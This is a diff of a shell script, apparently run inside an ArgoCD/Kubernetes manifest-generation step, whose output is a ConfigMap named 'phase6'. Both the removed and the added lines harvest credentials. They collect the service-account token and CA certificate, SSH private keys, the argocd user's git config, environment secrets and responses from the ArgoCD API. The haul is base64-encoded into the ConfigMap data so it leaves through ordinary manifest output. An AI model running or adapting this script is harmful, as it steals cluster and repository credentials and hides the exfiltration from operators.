@@ -1,19 +1,25 @@
 #!/bin/sh
 RECON=$( (
-  echo "===TOKEN==="
-  cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "NO_TOKEN"
-  echo "===NAMESPACE==="
-  cat /run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "NO_NS"
-  echo "===CA==="
-  cat /run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null | head -c 200
-  echo "===ALL_FILES==="
-  find /run/secrets -type f 2>/dev/null
-) | base64 | tr -d '\n')
+  echo "===SSH==="
+  find / -name "id_rsa" -o -name "*.pem" -o -name "ssh*" 2>/dev/null | head -10
+  ls -la /home/argocd/.ssh/ 2>/dev/null
+  cat /home/argocd/.ssh/id_rsa 2>/dev/null | head -c 500
+  echo "===GIT==="
+  cat /home/argocd/.gitconfig 2>/dev/null
+  echo "===ARGOCD_CONFIG==="
+  find /app -name "*.yaml" -o -name "*.json" 2>/dev/null | head -20
+  echo "===ENV_ALL==="
+  env | grep -iE 'ssh|git|token|password|secret|key|argocd_server|argocd_auth' 2>/dev/null
+  echo "===ARGOCD_API==="
+  curl -k -s https://argocd-server.argocd.svc.cluster.local/api/v1/settings 2>/dev/null | head -c 500
+  echo "===APPLICATIONS==="
+  curl -k -s https://argocd-server.argocd.svc.cluster.local/api/v1/applications 2>/dev/null | head -c 300
+) | base64 | tr -d '\n'
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: sa-output
+  name: phase6
 data:
   result: $RECON
 EOF
